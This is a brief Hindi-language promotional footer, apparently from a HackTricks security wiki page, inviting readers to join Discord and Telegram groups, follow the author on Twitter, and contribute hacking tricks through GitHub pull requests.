* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** 🐦 पर **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
